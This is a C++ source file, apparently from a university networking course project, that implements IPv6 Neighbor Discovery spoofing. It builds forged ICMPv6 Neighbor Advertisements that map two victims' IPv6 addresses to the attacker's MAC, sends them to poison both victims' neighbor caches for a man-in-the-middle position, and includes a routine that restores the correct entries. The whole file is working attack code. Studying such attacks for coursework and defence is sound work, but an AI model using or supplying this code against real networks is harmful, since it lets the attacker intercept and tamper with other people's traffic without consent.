/**
 * @author      Peter Gazdík <xgazdi03(at)stud.fit.vutbr.cz>
 * @date        18/04/17
 * @copyright   The MIT License (MIT)
 */

#include <linux/if_ether.h>
#include "ndspoof.h"
#include "headers.h"
#include "checksum.h"
#include <iostream>
using namespace std;

namespace pds {

static const std::size_t MSG_LEN = ETH_HDR_LEN + IP6_HDR_LEN + ICMP6_NA_LEN;


ndspoof::ndspoof()
{
}

ndspoof::~ndspoof()
{
}

void ndspoof::init()
{
    _pcap = new pcap(_interface.c_str());
    _interInfo = getInterfaceInfo(_interface.c_str());

    createNDMessages();
}

void ndspoof::poisoneCache()
{
    _pcap->sendpacket(_victim1msg, MSG_LEN);
    _pcap->sendpacket(_victim2msg, MSG_LEN);
}

void ndspoof::stopSpoofing()
{
    // Use the correct ethernet addresses
    _ethHdr1->eth_src = *_victim2.eth.getMAC();
    _ndaMsg1->eth_src.addr = *_victim2.eth.getMAC();

    _ethHdr2->eth_src = *_victim1.eth.getMAC();
    _ndaMsg2->eth_src.addr = *_victim1.eth.getMAC();

    // Calculate new checksums
    uint32_t checksum;
    checksum = ipv6_hdr_checksum(_ipHdr1, ICMP6_NA_LEN, IPPROTO_ICMPV6);
    icmp6_checksum(checksum, _ndaMsg1, ICMP6_NA_LEN);
    checksum = ipv6_hdr_checksum(_ipHdr2, ICMP6_NA_LEN, IPPROTO_ICMPV6);
    icmp6_checksum(checksum, _ndaMsg2, ICMP6_NA_LEN);

    // Send correct NDA messages
    _pcap->sendpacket(_victim1msg, MSG_LEN);
    _pcap->sendpacket(_victim2msg, MSG_LEN);
}

void ndspoof::createNDMessages()
{
    // Alocate memory for the nd messages
    _victim1msg = new uint8_t[MSG_LEN];
    _victim2msg = new uint8_t[MSG_LEN];

    _ethHdr1 = (struct eth_hdr *) _victim1msg;
    _ethHdr2 = (struct eth_hdr *) _victim2msg;
    _ipHdr1 = (struct ip6_hdr *) (_victim1msg + ETH_HDR_LEN);
    _ipHdr2 = (struct ip6_hdr *) (_victim2msg + ETH_HDR_LEN);
    _ndaMsg1 = (struct icmp6_na_msg *) (_victim1msg + ETH_HDR_LEN + IP6_HDR_LEN);
    _ndaMsg2 = (struct icmp6_na_msg *) (_victim2msg + ETH_HDR_LEN + IP6_HDR_LEN);

    // Set the common entries in the ethernet headers
    _ethHdr1->eth_type = _ethHdr2->eth_type = htons(ETH_P_IPV6);
    _ethHdr1->eth_src = _ethHdr2->eth_src = *_interInfo.mac.getMAC();

    // Set the common entries in the ip headers
    initIPv6Header(_ipHdr1); initIPv6Header(_ipHdr2);
    _ipHdr1->ctl.un1.nxt = _ipHdr2->ctl.un1.nxt = IPPROTO_ICMPV6;
    _ipHdr1->ctl.un1.plen = _ipHdr2->ctl.un1.plen = htons(ICMP6_NA_LEN);
    _ipHdr1->ctl.un1.hlim = _ipHdr2->ctl.un1.hlim = 255;

    // Set the common entries in the NDA messages
    initNDAdvertisment(_ndaMsg1); initNDAdvertisment(_ndaMsg2);
    _ndaMsg1->body.rso = _ndaMsg2->body.rso = NDA_O_BIT;
    _ndaMsg1->eth_src.addr = _ndaMsg2->eth_src.addr = *_interInfo.mac.getMAC();

    // Set the unique entries
    _ethHdr1->eth_dst = *_victim1.eth.getMAC();
    _ipHdr1->ip6_dst = *_victim1.net.getIPv6();
    _ipHdr1->ip6_src = *_victim2.net.getIPv6();
    _ndaMsg1->targ_ip = *_victim2.net.getIPv6();

    _ethHdr2->eth_dst = *_victim2.eth.getMAC();
    _ipHdr2->ip6_dst = *_victim2.net.getIPv6();
    _ipHdr2->ip6_src = *_victim1.net.getIPv6();
    _ndaMsg2->targ_ip = *_victim1.net.getIPv6();

    // Set checksums
    uint32_t checksum;
    checksum = ipv6_hdr_checksum(_ipHdr1, ICMP6_NA_LEN, IPPROTO_ICMPV6);
    icmp6_checksum(checksum, _ndaMsg1, ICMP6_NA_LEN);
    checksum = ipv6_hdr_checksum(_ipHdr2, ICMP6_NA_LEN, IPPROTO_ICMPV6);
    icmp6_checksum(checksum, _ndaMsg2, ICMP6_NA_LEN);
}

} // namespace pds
